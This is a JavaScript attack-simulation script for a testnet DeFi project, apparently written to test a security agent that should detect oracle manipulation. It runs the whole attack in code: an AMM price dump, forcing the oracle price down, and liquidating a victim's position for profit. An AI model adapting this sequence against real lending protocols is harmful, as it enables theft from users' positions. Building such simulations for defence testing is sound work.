/**
 * AMEN - Flash Loan Attack Simulation
 * 
 * This script simulates a realistic flash-loan oracle manipulation attack:
 * 
 * ATTACK FLOW:
 * 1. Attacker swaps large amount of WETH → USDC (tanks ETH price on AMM)
 * 2. Attacker manipulates oracle price downward
 * 3. Victim's health factor drops below liquidation threshold
 * 4. Attacker liquidates victim's position
 * 5. Attacker restores oracle/AMM prices
 * 6. Attacker profits from liquidation bonus
 * 
 * DETECTION SIGNALS (what agent should catch):
 * - Large price deviation in single block
 * - Multiple swaps in same block
 * - Oracle price doesn't match AMM price
 * - Same-block price recovery
 * - Liquidation immediately after price drop
 */

import { ethers } from 'ethers';
import dotenv from 'dotenv';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config({ path: path.join(__dirname, '..', '.env') });

// Contract ABIs (minimal required functions)
const WETH_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function approve(address spender, uint256 amount) returns (bool)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "function mint(address to, uint256 amount)"
];

const USDC_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function approve(address spender, uint256 amount) returns (bool)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "function mint(address to, uint256 amount)",
    "function decimals() view returns (uint8)"
];

const ORACLE_ABI = [
    "function price() view returns (uint256)",
    "function getPrice() view returns (uint256, uint256, uint256)",
    "function updatePrice(uint256 newPrice)",
    "function forceUpdatePrice(uint256 newPrice)"
];

const AMM_ABI = [
    "function getReserves() view returns (uint256, uint256, uint256)",
    "function getSpotPrice() view returns (uint256)",
    "function swapWethForUsdc(uint256 wethIn) returns (uint256)",
    "function swapUsdcForWeth(uint256 usdcIn) returns (uint256)",
    "function paused() view returns (bool)"
];

const VAULT_ABI = [
    "function getPosition(address user) view returns (uint256, uint256, uint256, uint256, uint256)",
    "function getHealthFactor(address user) view returns (uint256)",
    "function isLiquidatable(address user) view returns (bool, uint256)",
    "function liquidate(address user, uint256 repayAmount)",
    "function paused() view returns (bool)",
    "function liquidationsBlocked() view returns (bool)"
];

class AttackSimulator {
    constructor() {
        // Load configuration
        this.rpcUrl = process.env.SEPOLIA_RPC_URL;
        this.attackerKey = process.env.ATTACKER_PRIVATE_KEY;
        
        if (!this.rpcUrl || !this.attackerKey) {
            throw new Error('Missing SEPOLIA_RPC_URL or ATTACKER_PRIVATE_KEY in .env');
        }

        // Load deployment addresses
        const deploymentPath = path.join(__dirname, '..', 'contracts', 'deployments', 'sepolia-deployment.json');
        if (!fs.existsSync(deploymentPath)) {
            throw new Error('Deployment file not found. Run contract deployment first.');
        }
        this.deployment = JSON.parse(fs.readFileSync(deploymentPath, 'utf8'));

        // Setup provider and signer
        this.provider = new ethers.JsonRpcProvider(this.rpcUrl);
        this.attacker = new ethers.Wallet(this.attackerKey, this.provider);

        // Setup contract instances
        this.weth = new ethers.Contract(this.deployment.contracts.WETH, WETH_ABI, this.attacker);
        this.usdc = new ethers.Contract(this.deployment.contracts.USDC, USDC_ABI, this.attacker);
        this.oracle = new ethers.Contract(this.deployment.contracts.ORACLE, ORACLE_ABI, this.attacker);
        this.amm = new ethers.Contract(this.deployment.contracts.AMM, AMM_ABI, this.attacker);
        this.vault = new ethers.Contract(this.deployment.contracts.LENDING_VAULT, VAULT_ABI, this.attacker);
    }

    async log(message, data = null) {
        const timestamp = new Date().toISOString();
        console.log(`[${timestamp}] ${message}`);
        if (data) {
            console.log('  ', JSON.stringify(data, null, 2));
        }
    }

    async getState() {
        const [oraclePrice, , ] = await this.oracle.getPrice();
        const [wethReserve, usdcReserve, spotPrice] = await this.amm.getReserves();
        const blockNumber = await this.provider.getBlockNumber();

        return {
            blockNumber,
            oraclePrice: ethers.formatUnits(oraclePrice, 8),
            spotPrice: ethers.formatUnits(spotPrice, 8),
            wethReserve: ethers.formatEther(wethReserve),
            usdcReserve: ethers.formatUnits(usdcReserve, 6),
            priceDeviation: Math.abs(
                (Number(ethers.formatUnits(oraclePrice, 8)) - Number(ethers.formatUnits(spotPrice, 8))) /
                Number(ethers.formatUnits(oraclePrice, 8)) * 100
            ).toFixed(2) + '%'
        };
    }

    async checkVictimPosition(victimAddress) {
        const [collateral, debt, healthFactor, collateralUsd, maxBorrow] = 
            await this.vault.getPosition(victimAddress);
        const [isLiquidatable, hf] = await this.vault.isLiquidatable(victimAddress);

        return {
            collateral: ethers.formatEther(collateral),
            debt: ethers.formatUnits(debt, 6),
            healthFactor: Number(healthFactor) / 100,
            collateralUsd: ethers.formatUnits(collateralUsd, 6),
            isLiquidatable
        };
    }

    async executeAttack(victimAddress) {
        console.log('\n═══════════════════════════════════════════════════════════════');
        console.log('       🚨 AMEN - FLASH LOAN ATTACK SIMULATION 🚨               ');
        console.log('═══════════════════════════════════════════════════════════════\n');

        await this.log('🎯 Attack Target:', { victim: victimAddress });
        await this.log('👤 Attacker:', { address: this.attacker.address });

        // Check initial state
        await this.log('\n📊 STEP 0: Initial Market State');
        let state = await this.getState();
        await this.log('Market state:', state);

        let victimPosition = await this.checkVictimPosition(victimAddress);
        await this.log('Victim position:', victimPosition);

        if (!victimPosition.debt || victimPosition.debt === '0.0') {
            await this.log('❌ Victim has no debt position. Cannot liquidate.');
            return;
        }

        // Check if protocol is paused (agent might have already acted)
        const isPaused = await this.vault.paused();
        const liquidationsBlocked = await this.vault.liquidationsBlocked();
        
        if (isPaused) {
            await this.log('🛡️ ATTACK BLOCKED: Protocol is paused by security agent!');
            return;
        }

        // =================================================================
        // STEP 1: Manipulate AMM Price (simulate flash loan dump)
        // =================================================================
        await this.log('\n💰 STEP 1: AMM Price Manipulation');
        await this.log('Simulating flash loan - dumping WETH to crash price...');

        // Get attacker's WETH balance
        let attackerWeth = await this.weth.balanceOf(this.attacker.address);
        await this.log('Attacker WETH balance:', { balance: ethers.formatEther(attackerWeth) });

        if (attackerWeth < ethers.parseEther("10")) {
            await this.log('⚠️ Attacker needs more WETH. Attempting to get from faucet...');
            // In real attack, this would be flash-loaned
            // For simulation, we need deployer to have minted to attacker
            return;
        }

        // Approve and swap
        const swapAmount = ethers.parseEther("50"); // Large swap to move price
        await this.log('Approving WETH for AMM...');
        let tx = await this.weth.approve(this.deployment.contracts.AMM, swapAmount);
        await tx.wait();

        await this.log('Executing large swap (50 WETH → USDC)...');
        tx = await this.amm.swapWethForUsdc(swapAmount);
        const swapReceipt = await tx.wait();
        await this.log('Swap executed in block:', { block: swapReceipt.blockNumber });

        state = await this.getState();
        await this.log('Market state after AMM manipulation:', state);

        // =================================================================
        // STEP 2: Manipulate Oracle Price
        // =================================================================
        await this.log('\n🔮 STEP 2: Oracle Price Manipulation');
        
        // Calculate manipulated price (40% drop)
        const [currentOraclePrice, ,] = await this.oracle.getPrice();
        const manipulatedPrice = currentOraclePrice * 60n / 100n; // 40% price drop
        
        await this.log('Forcing oracle price down...', {
            currentPrice: ethers.formatUnits(currentOraclePrice, 8),
            manipulatedPrice: ethers.formatUnits(manipulatedPrice, 8),
            drop: '40%'
        });

        try {
            tx = await this.oracle.forceUpdatePrice(manipulatedPrice);
            await tx.wait();
            await this.log('✅ Oracle manipulated successfully');
        } catch (error) {
            await this.log('❌ Oracle manipulation failed (may need owner access):', { 
                error: error.message 
            });
            // Continue anyway to show detection
        }

        state = await this.getState();
        await this.log('Market state after oracle manipulation:', state);

        // =================================================================
        // STEP 3: Check Victim is Now Liquidatable
        // =================================================================
        await this.log('\n🎯 STEP 3: Checking Victim Liquidatability');
        victimPosition = await this.checkVictimPosition(victimAddress);
        await this.log('Victim position after manipulation:', victimPosition);

        // =================================================================
        // STEP 4: Attempt Liquidation
        // =================================================================
        await this.log('\n⚔️ STEP 4: Attempting Liquidation');

        // Check security measures
        const isPausedNow = await this.vault.paused();
        const liquidationsBlockedNow = await this.vault.liquidationsBlocked();

        if (isPausedNow) {
            await this.log('🛡️ ATTACK BLOCKED: Protocol paused by security agent!');
            await this.log('Security system successfully detected and prevented attack.');
            await this.restoreState();
            return;
        }

        if (liquidationsBlockedNow) {
            await this.log('🛡️ ATTACK BLOCKED: Liquidations blocked by security agent!');
            await this.log('Security system detected oracle manipulation.');
            await this.restoreState();
            return;
        }

        if (!victimPosition.isLiquidatable) {
            await this.log('❌ Victim is not liquidatable (health factor still healthy)');
            await this.restoreState();
            return;
        }

        // Get USDC for liquidation
        const attackerUsdc = await this.usdc.balanceOf(this.attacker.address);
        await this.log('Attacker USDC balance:', { balance: ethers.formatUnits(attackerUsdc, 6) });

        if (attackerUsdc < ethers.parseUnits("1000", 6)) {
            await this.log('⚠️ Attacker needs USDC for liquidation');
            await this.restoreState();
            return;
        }

        // Approve and liquidate
        const liquidationAmount = ethers.parseUnits(victimPosition.debt, 6);
        await this.log('Approving USDC for liquidation...');
        tx = await this.usdc.approve(this.deployment.contracts.LENDING_VAULT, liquidationAmount);
        await tx.wait();

        await this.log('Executing liquidation...');
        try {
            tx = await this.vault.liquidate(victimAddress, liquidationAmount);
            const liquidationReceipt = await tx.wait();
            await this.log('💀 LIQUIDATION SUCCESSFUL!', { 
                block: liquidationReceipt.blockNumber,
                txHash: tx.hash
            });

            // Check profit
            const newAttackerWeth = await this.weth.balanceOf(this.attacker.address);
            const wethProfit = newAttackerWeth - attackerWeth;
            await this.log('Attacker profit:', {
                wethGained: ethers.formatEther(wethProfit),
                liquidationBonus: '5%'
            });

        } catch (error) {
            if (error.message.includes('paused') || error.message.includes('blocked')) {
                await this.log('🛡️ ATTACK BLOCKED: Security agent intervened!');
            } else {
                await this.log('❌ Liquidation failed:', { error: error.message });
            }
        }

        // =================================================================
        // STEP 5: Restore Prices (complete the "flash loan")
        // =================================================================
        await this.restoreState();
    }

    async restoreState() {
        await this.log('\n🔄 STEP 5: Restoring Market State (completing flash loan cycle)');

        // Restore oracle price
        const normalPrice = 200000000000n; // $2000
        try {
            const tx = await this.oracle.forceUpdatePrice(normalPrice);
            await tx.wait();
            await this.log('✅ Oracle price restored to $2000');
        } catch (error) {
            await this.log('⚠️ Could not restore oracle (may need owner)');
        }

        // Swap back (optional - simulates returning flash loan)
        // In real attack, attacker would swap USDC back to WETH

        const state = await this.getState();
        await this.log('Final market state:', state);

        console.log('\n═══════════════════════════════════════════════════════════════');
        console.log('                    ATTACK SIMULATION COMPLETE                  ');
        console.log('═══════════════════════════════════════════════════════════════\n');
    }
}

// Main execution
async function main() {
    const simulator = new AttackSimulator();
    
    // Get victim address from command line or use default
    const victimAddress = process.argv[2] || process.env.VICTIM_ADDRESS;
    
    if (!victimAddress) {
        console.log('Usage: node attack-simulation.js <victim_address>');
        console.log('Or set VICTIM_ADDRESS in .env');
        console.log('\nFirst run setup-victim.js to create a victim position.');
        process.exit(1);
    }

    await simulator.executeAttack(victimAddress);
}

main().catch(console.error);
